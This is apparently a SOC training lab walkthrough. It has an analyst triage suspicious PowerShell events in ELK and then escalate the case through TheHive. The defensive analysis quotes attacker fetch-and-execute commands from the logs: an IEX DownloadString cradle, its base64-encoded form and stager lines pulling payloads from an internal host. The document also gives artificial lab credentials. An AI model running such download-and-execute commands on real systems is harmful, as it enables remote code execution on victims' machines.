As a SOC Level 1 analyst at Syntrix, you are performing routine monitoring in the ELK stack when you notice a series of Windows event logs indicating potentially suspicious PowerShell execution on a workstation. Your task is to conduct initial triage by reviewing the relevant Windows event logs in ELK to determine whether the activity appears malicious. Once your assessment is complete, you will document your findings and escalate the case to SOC Level 2 through TheHive for deeper analysis.

# Lab Environment

In this lab environment, you will have GUI access to two Ubuntu machines, one hosting `ELK` and the other hosting `TheHive`. You can access `ELK` at `http://localhost:5601`, where the logs should be visible under the `syntrix` index pattern. You can access the case management platform, `TheHive`, at `http://localhost:9000` using the following analyst credentials:

- **Username:** soc1@syntrix.com
- **Password:** pass123

**Objective:** Perform an initial triage of suspicious PowerShell activity found in Windows event logs to determine potential malicious behavior, and document your findings in TheHive for further investigation. (Analyze the events generated in **November 2025**.)

# Tools
The best tools for this lab are:

- ELK
- TheHive

# Technical Workload
**Step 1:** On the **ELK** tab, open Firefox and navigate to `http://localhost:5601`.
![[Pasted image 20260508113534.png]]

**Step 2:** Go to **Discover**.
![[Pasted image 20260508113554.png]]

Change the index pattern to `syntrix`.
![[Pasted image 20260508113610.png]]

Set the time frame to "Last 1 year" or any other relevant range. 
Note: The events to be analyzed were generated in **November 2025**.
![[Pasted image 20260508113641.png]]

**Step 3:** Let’s begin our investigation. Any PowerShell-related activity should be present in the **PowerShell Operational** logs, which can be queried using the following query:

**Query:**

```
winlog.channel:"Microsoft-Windows-PowerShell/Operational" AND winlog.event_id:4104
```

Here, we are filtering for **Event ID 4104 (Script Block Logging)**. It captures the de-obfuscated content of PowerShell script blocks, including commands, functions, and entire scripts, regardless of how they are executed (e.g., direct command-line entry, .ps1 files, modules, or in-memory execution).
![[Pasted image 20260508114024.png]]

Arrange the events in ascending order and then check the event log at timestamp: Nov 17, 2025 @ 11:21:33.749.
![[Pasted image 20260508114158.png]]


A PowerShell command was executed on `PC01` under user `sarah`. What the command does:

```
IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.11/haha.ps1')
```

- `New-Object Net.WebClient` → Creates a web client to fetch content from the internet.
- `DownloadString('http://10.0.0.11/haha.ps1')` → Downloads a Powershell script named "haha.ps1" from a different host.
- `IEX` → Executes the downloaded script immediately in memory without writing it to disk.

This is highly suspicious because it represents a typical pattern used by attackers leveraging PowerShell to download and execute malicious scripts (often referred to as Living off the Land (LoL) attacks).

Check the next event log at timestamp: Nov 17, 2025 @ 11:21:33.991.
![[Pasted image 20260508114258.png]]

This is most likely the content of `haha.ps1` that was executed. The script block reads:

```
powershell.exe -nop -w hidden -e WwBOAGUAdAAu....
```

**Red Flags:**

- `-nop` → No profile (avoids loading user PowerShell profile)
    
- `-w hidden` → Window hidden
    
- `-e` → Encoded command (Base64 encoded). The long string after `-e` is Base64-encoded PowerShell, which is very often used in attacks to obfuscate payloads.
    
- Executed by a user account (**sarah**). Could be compromised.
    

Check the next event log at timestamp: Nov 17, 2025 @ 11:21:34.158.
![[Pasted image 20260508114614.png]]

This shows the base64 decoded content of the `haha.ps1` script:

```
...
...
IEX ((new-object Net.WebClient).DownloadString('http://10.0.0.11:8080/nj6VXD4hquF64Q/Z2oecggFq'));IEX ((new-object Net.WebClient).DownloadString('http://10.0.0.11:8080/nj6VXD4hquF64Q'));
```

In essence, it downloads and executes additional scripts directly in memory. This confirms that `haha.ps1` is essentially a stager for another payload.

This appears to be a malicious activity: typical of malware downloaders, living-off-the-land attacks, or attacker post-exploitation behavior.

Check the next follow-up event at timestamp: Nov 17, 2025 @ 11:21:34.301.

![Content Image](https://assets.ine.com/lab/learningpath/d496c05e42f0b3eed3d3654856682b921269587f45dbbeaadf041f6213ce8f27.png)

This shows a heavily obfuscated PowerShell script, which requires deeper analysis to determine its nature.

**Step 4:** Next, let's take a look at Sysmon Process creation events (**Event ID 1**) around the same time.

**Query:**

```
winlog.channel:"Microsoft-Windows-Sysmon/Operational" AND winlog.event_id:1
```

Check the log at timestamp: Nov 17, 2025 @ 11:21:33.293.

![Content Image](https://assets.ine.com/lab/learningpath/dcf7c2d11ec38925944a05ea32a1b5346bae730f0bec34bab29983900b85519e.png)

This Sysmon Process creation log shows that a new process (**powershell.exe**) was launched by **explorer.exe** under user **sarah**, and the command was executed:

```
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADAALgAwAC4AMQAxAC8AaABhAGgAYQAuAHAAcwAxACcAKQA="
```

This base64 encoded command decodes to:

```
IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.11/haha.ps1')
```

This is the same command observed in the PowerShell Operational logs; however, this shows the exact way it was executed.

**Step 5:** Let's also take a look at Sysmon Network Connection events (**Event ID 3**) around the same time.

**Query:**

```
winlog.channel:"Microsoft-Windows-Sysmon/Operational" AND winlog.event_id:3
```

Check the logs at the following timestamps: Nov 17, 2025 @ 11:21:35.229, Nov 17, 2025 @ 11:21:36.264 and the following Nov 17, 2025 @ 11:21:36.264.

![[Pasted image 20260508114905.png]]

![[Pasted image 20260508114924.png]]

![[Pasted image 20260508114942.png]]

This shows that PowerShell (**powershell.exe**) on **PC01** was used to initiate TCP connections to **10.0.0.11** on ports **80**, **8080**, and **4444** from source IP **10.0.0.50**, under the user account **sarah**. We will treat 10.0.0.11 as the suspected attacker-controlled host, while PC01 (victim) is at 10.0.0.50.

We have gathered enough evidence and determined the PowerShell activity to be highly suspicious and most likely malicious. However, its true nature and purpose remain unknown and require deeper investigation.

**Step 6:** Let's head over to TheHive to document our findings. Switch to **TheHive** tab, open Firefox and navigate to `http://localhost:9000`. Log in using the following credentials:

- **Username:** soc1@syntrix.com
- **Password:** pass123

![[Pasted image 20260508104229.png]]

Click on Create case.
![[Pasted image 20260508104253.png]]

Select the "Empty case."
![[Pasted image 20260508104308.png]]

Fill in the details.

- **Title:** Suspicious PowerShell Activity Triggering Remote Script Execution
    
- **Date:** Current date and time.
    
- **Severity:** `High`
    
- **TLP:** `TLP:Amber` (Indicates limited sharing; can be shared within your organization and with its clients on a need-to-know basis.)
    
- **PAP:** `PAP:AMBER` (Indicates that only passive checks are allowed. You can query third-party services (WHOIS, VirusTotal, etc.). You can set up honeypots to monitor traffic, but no direct interaction with the target.)
    
- **Tags:** `powershell`, `scriptblock-logging`, `encoded-command`, `remote-script-execution`, `living-off-the-land`
    
- **Description:** Multiple PowerShell events were observed in ELK, showing script block execution initiated on a workstation. The commands retrieved remote PowerShell scripts from a host and executed them in memory, leveraging obfuscation and encoding techniques. Network connections were observed originating from PowerShell, suggesting staged payload delivery and potential malicious behavior.
    

Skip the "Tasks" for now and click **Confirm**. Your case will be created.

![[Pasted image 20260508115038.png]]

**What is TLP (Traffic Light Protocol)?**

It is a standard way to classify the sensitivity of information so that recipients know how widely it can be shared.

|**TLP Level**|**Description**|
|---|---|
|**TLP:Clear**|Public information; can be shared freely.|
|**TLP:Green**|For community use; share with trusted peers and partner organizations.|
|**TLP:Amber**|Limited sharing; can be shared within your organization and with its clients on a need-to-know basis.|
|**TLP:Amber+Strict**|Even more restricted; can be shared only within your own organization.|
|**TLP:Red**|Highly sensitive; for named recipients only, no further sharing allowed.|

**What is PAP (Permissible Actions Protocol)?**

It specifies how the received information can be used.

| **PAP Level** | **Description**                                                                                                                                                               |
| ------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **PAP:CLEAR** | No restrictions. Can be used freely without operational limitations.                                                                                                          |
| **PAP:GREEN** | Active actions allowed. You can block traffic, ping the target, or actively interact with it.                                                                                 |
| **PAP:AMBER** | Passive checks allowed. You can query third-party services (WHOIS, VirusTotal, etc.). You can set up honeypots to monitor traffic, but no direct interaction with the target. |
| **PAP:RED**   | Non-detectable actions only. Only log review or offline analysis. No active scanning, blocking, or interacting.                                                               |


![[Pasted image 20260508115055.png]]

**Step 8:** Next, go to **Observables** and click the "+" button to add a new observable.
![[Pasted image 20260508115111.png]]

Fill in the details.

**1. Suspected Attacker-controlled Host IP**

|Field|Value|
|---|---|
|Type|`ip`|
|Value|`10.0.0.11`|
|TLP|`TLP:Amber`|
|PAP|`PAP:Amber`|
|Is IOC|Yes|
|Has been sighted|Yes (seen in PowerShell and Sysmon logs)|
|Sighted at|17/11/2025 @ 11:21:33|
|Ignore Similarity|No|
|Tags|`attacker`, `powershell`|
|Description|Internal IP used as the source server hosting remote PowerShell scripts accessed by the affected workstation.|

![[Pasted image 20260508115137.png]]

Next, click **"Save and add another"**.

**2. Target Workstation**

|Field|Value|
|---|---|
|Type|`hostname`|
|Value|`PC01`|
|TLP|`TLP:Green`|
|PAP|`PAP:Amber`|
|Is IOC|No (victim host, not malicious)|
|Has been sighted|Yes|
|Sighted at|17/11/2025 @ 11:21:33|
|Ignore Similarity|Yes|
|Tags|`victim-endpoint`, `workstation`, `windows`|
|Description|Workstation observed executing suspicious PowerShell scripts and initiating network connections.|

![[Pasted image 20260508115202.png]]

Similarly, add the other observables by referring to the following tables:

**3. User Involved**

|Field|Value|
|---|---|
|Type|`other`|
|Value|`sarah`|
|TLP|`TLP:Amber`|
|PAP|`PAP:Amber`|
|Is IOC|No (possibly compromised credential)|
|Has been sighted|Yes|
|Sighted at|17/11/2025 @ 11:21:33|
|Ignore Similarity|Yes|
|Tags|`user-activity`, `possible-account-compromise`|
|Description|Account executing suspicious PowerShell commands; may be compromised or misused.|

**4. Malicious Script Download URL**

|Field|Value|
|---|---|
|Type|`url`|
|Value|`http://10.0.0.11/haha.ps1`|
|TLP|`TLP:Amber`|
|PAP|`PAP:Amber`|
|Is IOC|Yes|
|Has been sighted|Yes|
|Sighted at|17/11/2025 @ 11:21:33|
|Ignore Similarity|No|
|Tags|`downloader`, `powershell`, `script-execution`|
|Description|URL used to retrieve and execute PowerShell script directly in memory.|

**5. Follow-On Payload Download URL**

|Field|Value|
|---|---|
|Type|`url`|
|Value|`http://10.0.0.11:8080/nj6VXD4hquF64Q/Z2oecggFq`|
|TLP|`TLP:Amber`|
|PAP|`PAP:Amber`|
|Is IOC|Yes|
|Has been sighted|Yes|
|Sighted at|17/11/2025 @ 11:21:34|
|Ignore Similarity|No|
|Tags|`payload`, `staged-execution`, `remote-script`|
|Description|Secondary script download likely containing the actual payload.|

**6. Detected Script Filename**

|Field|Value|
|---|---|
|Type|`filename`|
|Value|`haha.ps1`|
|TLP|`TLP:Amber`|
|PAP|`PAP:Amber`|
|Is IOC|Yes|
|Has been sighted|Yes|
|Sighted at|17/11/2025 @ 11:21:33|
|Ignore Similarity|No|
|Tags|`powershell-script`, `suspicious-file`, `memory-execution`|
|Description|Remote PowerShell script executed directly in memory; likely used as initial stager.|

**7. PowerShell Execution Command**

|Field|Value|
|---|---|
|Type|`other`|
|Value|`IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.11/haha.ps1')`|
|TLP|`TLP:Amber`|
|PAP|`PAP:Amber`|
|Is IOC|Yes|
|Has been sighted|Yes|
|Sighted at|17/11/2025 @ 11:21:33|
|Ignore Similarity|No|
|Tags|`lotl`, `powershell`, `encoded-command`, `memory-execution`|
|Description|Suspicious command showing in-memory execution of remote script using built-in system utilities.|

**8. Network Ports Observed**

|Field|Value|
|---|---|
|Type|`other`|
|Value|80, 8080, 4444|
|TLP|`TLP:Green`|
|PAP|`PAP:Amber`|
|Is IOC|Context-dependent (No for 80, Yes-possible for 8080 & 4444) → mark as: No|
|Has been sighted|Yes|
|Sighted at|17/11/2025 @ 11:21:35|
|Ignore Similarity|Yes|
|Tags|`network-traffic`, `powershell`, `remote-script`|
|Description|Multiple outbound network connections initiated via PowerShell to suspected attacker-controlled host, involving ports 80 (standard web), 8080 (alternate web / potential staging), and 4444 (commonly used for remote shells or C2-style communication).|

After all observables are added, click **"Confirm"**.

![[Pasted image 20260508115228.png]]

**Step 9:** Next, go to **TTPs**. Click the **"+"** button to add TTPs.
![[Pasted image 20260508115250.png]]

Fill in the details.

- Set the **"Occur date"** to: 17/11/2025 @ 11:21:33
- Select the following **Techniques**:
    
    - **Execution:**
        - T1059.001 - PowerShell
        - **_Reason:_** PowerShell used to execute scripts remotely and in memory
    - **Defense Evasion:**
        
        - T1027 - Obfuscated Files or Information
        - **_Reason:_** Base64 encoded command + hidden execution parameters
    - **Lateral Movement:**
        
        - T1570 - Lateral Tool Transfer
        - **_Reason:_** Scripts downloaded from suspected attacker-controlled host

After adding the TTPs, click **"Confirm"**.

![[Pasted image 20260508115327.png]]

**Step 10:** Next, go to **Tasks**. Click the **"+"** button to add a task.

Fill in the task details, and assign it to an SOC 2 analyst (soc2@syntrix.com).

**Task 1 — Host and User Context Review**

- **Title:** Context on Suspected Attacker-controlled Host and User Account
    
- **Description:** The observed PowerShell activity included repeated outbound connections from the workstation to the internal host 10.0.0.11 over ports 80, 8080, and 4444, executed under the user account sarah. Reviewing this host may help determine whether it shows indications of initial breach/foothold. Likewise, examining recent activity associated with the user account could provide insight into whether it was misused or compromised during the observed timeframe.
    

![[Pasted image 20260508115403.png]]

Next, click **"Save and add another"**

**Task 2 — Script and Payload Retrieval**

- **Title:** Context on Retrieved Scripts
    
- **Description:** PowerShell commands were used to obtain and execute scripts from an internal host. The retrieved content included obfuscated and encoded segments. Reviewing these scripts and performing deeper analysis may provide insight into their true nature and purpose.
    
![[Pasted image 20260508115417.png]]

After adding all the tasks, click **"Confirm"**.

![[Pasted image 20260508115433.png]]

Finally, escalate the case to SOC level 2 by changing the case owner to an SOC 2 analyst (soc2@syntrix.com), as shown below:
![[Pasted image 20260508115456.png]]

![[Pasted image 20260508115515.png]]

# Conclusion

The analysis confirmed that the observed PowerShell activity on the workstation was highly suspicious and indicative of unauthorized script execution. Multiple logs showed that PowerShell was used to retrieve and run remote scripts in memory, making use of obfuscation and encoded commands. Network connections to the suspected attacker-controlled host across multiple ports further suggested possible staging behavior. The activity occurred under the user account sarah, raising the possibility of account misuse or compromise. All identified observables, including the PowerShell commands, hosts, associated ports, URLs and execution timestamps have been documented and escalated for deeper review of the involved hosts, user activity, and the true nature and purpose of the retrieved scripts.

# References

- [https://docs.strangebee.com/thehive/overview/]
- [https://www.misp-project.org/taxonomies.html]
